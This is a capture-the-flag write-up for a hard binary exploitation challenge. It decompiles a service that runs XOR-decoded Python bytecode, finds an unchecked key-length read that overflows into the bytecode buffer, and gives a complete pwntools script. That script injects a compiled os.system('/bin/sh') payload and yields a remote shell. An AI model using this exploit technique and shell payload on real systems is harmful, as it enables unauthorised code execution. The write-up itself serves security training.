### Description

We are given a netcat port and a zip-file, containing the source binary.

>**Proposed difficulty:** Hard
>**Kategori:** Binary Exploitation
>**Opgave beskrivelse** Du har lige købt en enhed fra "Trusted Solutions".
>
>De sælger 0day exploits, og deres nyeste burde være et af de bedste. De påstår at have state-of-the-art anti reversing, og enheden er svær at få adgang til.
>
>Du kan tilgå porten, der unlocker og executer exploitet, men kan du få RCE?
>
>nc trusted-solutions.hkn 1024
>
>[trusted-solutions.zip](https://nextcloud.ntp-event.dk:8443/s/kjiRC8fs3FNSbJG/download/trusted-solutions.zip)

---

### TLDR

`decrypt_exploit` contains an unrestricted buffer overflow, allowing the user to overflow into a buffer holding python bytecode, which is then written to a file. The program then proceeds to execute this pyc file. By overflowing the buffer with bytecode for popping a shell, we can obtain a shell on the system, giving us the flag.

---

### Initial recon

To get an overview of the code, let's open it up in ghidra to see what it actually does. It contains 4 functions of interest:

- `main`
- `login`
- `hash_func`
- `decrypt_exploit`

The main function is fairly simple:

```c
int main(void)

{
  bool res;
  
  setup();
  res = login();
  if (!res) {
    puts("Error in username or password");
  }
  decrypt_exploit();
  return 0;
}
```

It first calls login, then checks whether it returned false. We can presume it checked a password of some kind. Interestingly, the program continues despite an "incorrect" password. This would seem to suggest, that the real magic happens in `decrypt_exploit`. Let's check `login` first:

```c

bool login(void)

{
  int cmp;
  char *hash;
  long *in_FS_OFFSET;
  char password [72];
  long canary;
  
  canary = in_FS_OFFSET[5];
  memset(password,0,0x40);
  puts("Please log in!");
  printf("Password: ");
  __isoc99_scanf("%63s[^\n]",password);
  hash = hash_func(password);
  puts(hash);
  cmp = strcmp(hash,"5777777256277277772126770000000000000000");
  if (cmp != 0) {
    free(hash);
  }
  else {
    free(hash);
  }
  if (canary != in_FS_OFFSET[5]) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return cmp == 0;
}

```

Immediately a lot more interesting. It seems to take a users password input, put it through some hash function, then verifies whether or not the hash matches a hardcoded hash. The scanf used here is safe, and there is a stack canary, so let's go deeper:

```c
char * hash_func(char *string)

{
  char *hash;
  ulong len;
  char local_25;
  int i;
  
  hash = (char *)malloc(0x29);
  memset(hash,0,0x29);
  memset(hash,L'0',0x28);
  len = strlen(string);
  if (29 < len) {
    puts("End of the program....");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  i = 0;
  while( true ) {
    len = strlen(string);
    if (len <= (ulong)(long)i) break;
    local_25 = '1';
    if (',' < string[i]) {
      local_25 = '2';
    }
    if ('7' < string[i]) {
      local_25 = '3';
    }
    if ('C' < string[i]) {
      local_25 = '4';
    }
    if ('M' < string[i]) {
      local_25 = '5';
    }
    if ('W' < string[i]) {
      local_25 = '6';
    }
    if ('a' < string[i]) {
      local_25 = '7';
    }
    hash[i] = local_25;
    i = i + 1;
  }
  return hash;
}
```

Weird... Nothing stands out. We could probably generate a password hashing into the correct value, given the simplicity of the algorithm, but the program gives no good reason to do so. Let's jump back up to main and check out `decrypt_exploit` instead:

```c
void decrypt_exploit(void)

{
  long lVar1;
  char *code_pointer;
  char *buff_pointer;
  long *in_FS_OFFSET;
  int key_len;
  uint i;
  int f;
  undefined8 local_750;
  char *local_748;
  undefined8 local_740;
  byte key [32];
  char buff;
  char acStack_716 [1798];
  long canary;
  
  canary = in_FS_OFFSET[5];
  code_pointer = &code;
  buff_pointer = &buff;
  for (lVar1 = 0xdf; lVar1 != 0; lVar1 = lVar1 + -1) {
    *(undefined8 *)buff_pointer = *(undefined8 *)code_pointer;
    code_pointer = code_pointer + 8;
    buff_pointer = buff_pointer + 8;
  }
  *(undefined2 *)buff_pointer = *(undefined2 *)code_pointer;
  buff_pointer[2] = code_pointer[2];
  memset(key,0,0x20);
  puts("Provide size of key:");
  __isoc99_scanf("%d",&key_len);
  puts("Provide the key bytes:");
  read(0,key,key_len);
  for (i = 0; i < 1787; i = i + 1) {
    (&buff)[(int)i] = (&buff)[(int)i] ^ key[(int)i % 2];
  }
  f = open("./12893.pyc",0x242,0x1b6);
  if (f < 0) {
    puts("Error opening file!");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  write(f,&buff,0x6fb);
  close(f);
  local_748 = "./12893.pyc";
  local_740 = 0;
  local_750 = 0;
  system("/bin/python3 12893.pyc");
  if (canary != in_FS_OFFSET[5]) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Here we have something. The first section of code, seems to copy some bytes named `code` from a global to the stack. Then it takes a key size and key, after which it does some xoring on the buffer. It then writes the output to a pyc file, and attempts to execute it.

pyc files represent python bytecode, a form of semi-compiled code that python *actually* executes. The XOR section of the code is a little confusing, due to the type-casting that's going on, but it can be reduced to:

```c
buff[i] = buff[i] ^ key[i % 2]
```

Very odd. Despite accepting any length of key, this would only XOR with the first two bytes interchangeably.

Also notice the lines:

```c
__isoc99_scanf("%d",&key_len);
puts("Provide the key bytes:");
read(0,key,key_len);
```

An easy buffer overflow, but we'll wait with that.

---

### Getting the bytecode

As mentioned in recon, the python bytecode is xored with alternately the first and second bytes of our key input. With a bit of googling, it is revealed, that the pyc magic bytes change depending on the version of python. Importantly though, the third and fourth bytes are always 0D0A, as in b"\\r\\n".

Reading the third and fourth bytes from the binary, we get 1E3D. Doing a simple XOR with 0D0A, yields 1337, heh. Building a script around this:

```python
from pwn import *

conn = process("./trusted_partners")

conn.recvuntil(b": ")
conn.sendline(b"A")

conn.recvuntil(b":")
conn.sendline(b"2")

conn.recvuntil(b":")
conn.sendline(b"\x13\x37")
```

And the program outputs the pyc file. Trying to execute it, and...

```bash
$ python3 12893.pyc
RuntimeError: Bad magic number in .pyc file
```

Well, that either means it's corrupted, or it's the wrong python version. Check the magic bytes 6F0D0D0A online, and some sketchy websites would indicate that it's python 3.10. Bummer, i have 3.11. All hope is not lost, after changing the magic bytes, python 3.8 on the windows side seems to execute it somewhat successfully, though executing random bytecode is probably a bad idea... Anyway, it's good to know that 3.8 and 3.10 are somewhat compatible. Let's check what the remote does:

```bash
$ python3 solve.py
[+] Opening connection to trusted-solutions.hkn on port 1024: Done
[*] Switching to interactive mode

ctf
Running exploit...
[+] Leaking pointers...
[+] 4751193
[+] 4309086
[+] 5046567
[+] 4325350
[!] Trust zone found
[+] Leaking PAC upper bits
[+] Got them!
[:)] Executing /bin/sh
⠀⠀⠀⠀⠀⠀⠀⠀⣤⡀⠀⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣆⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠸⣷⣮⣿⣿⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡠⠒⠉⠀⠀⠀⠀⠀⠀⠈⠁⠲⢖⠒⡀⠀⠀
⠀⠀⠀⡠⠴⣏⠀⢀⡀⠀⢀⡀⠀⠀⠀⡀⠀⠀⡀⠱⡈⢄⠀
⠀⠀⢠⠁⠀⢸⠐⠁⠀⠄⠀⢸⠀⠀⢎⠀⠂⠀⠈⡄⢡⠀⢣
⠀⢀⠂⠀⠀⢸⠈⠢⠤⠤⠐⢁⠄⠒⠢⢁⣂⡐⠊⠀⡄⠀⠸
⠀⡘⠀⠀⠀⢸⠀⢠⠐⠒⠈⠀⠀⠀⠀⠀⠀⠈⢆⠜⠀⠀⢸
⠀⡇⠀⠀⠀⠀⡗⢺⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⡄⢀⠎
⠀⢃⠀⠀⠀⢀⠃⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠷⡃⠀
⠀⠈⠢⣤⠀⠈⠀⠀⠑⠠⠤⣀⣀⣀⣀⣀⡀⠤⠒⠁⠀⢡⠀
⡀⣀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⠀
⠑⢄⠉⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠀
⠀⠀⠑⠢⢱⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀
⠀⠀⠀⠀⢀⠠⠓⠢⠤⣀⣀⡀⠀⠀⣀⣀⡀⠤⠒⠑⢄⠀⠀
⠀⠀⠀⠰⠥⠤⢄⢀⡠⠄⡈⡀⠀⠀⣇⣀⠠⢄⠀⠒⠤⠣⠀
⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀
0
[*] Got EOF while reading in interactive
```

Well, it's something atleast. Of course this isn't the solution, so let's go back to that buffer overflow.

---

### The exploit

As mentioned earlier, this code allows us to overflow the buffer:

```c
__isoc99_scanf("%d",&key_len);
puts("Provide the key bytes:");
read(0,key,key_len);
```

The key buffer is 32 bytes long, but we control how much `read` reads through `key_len`. We know that the program uses a stack canary, so rip overwrite is not the way to go. Instead, checking the offsets in gdb (ghidra is a bit inconsistent), we can see, that while `key` is located at -0x730, the code buffer i located at -0x710. With padding of 32 bytes, we should be able to overwrite the code!

Modifying the code with a `key_len` of 69696969 and a key of `b"A" * 36`, should overwrite the first 4 bytes of the pyc file with null-bytes. Running the code, and checking with ghex, confirms this.

We should now be able to insert our own code into the file, which then gets executed. Assuming it ignores the remaining bytecode, a simple payload would look like:

```python
import os
os.system("/bin/sh")
```

Compiling this with:

```bash
python3 -m compileall payload.py
```

we can extract the payload bytes. Modifying the magic bytes to fit the specification of 6F0D0D0A, the payload is ready to be deployed. Adjusting the code to inject this payload:

```python
from pwn import *

# conn = process("./trusted_partners")
conn = remote("trusted-solutions.hkn", 1024)

with open("payload.pyc", "rb") as f:
    payload = f.read()

conn.recvuntil(b": ")
conn.sendline(b"A")

conn.recvuntil(b":")
conn.sendline(b"69696969")

key = b"\x00" * 32
key += payload

conn.recvuntil(b":")
conn.sendline(key)

conn.interactive()
```

And we are dropped into a shell. `flag.txt` then gives us the flag:

> DDC{Sometimes_its_not_about_getting_rip_control}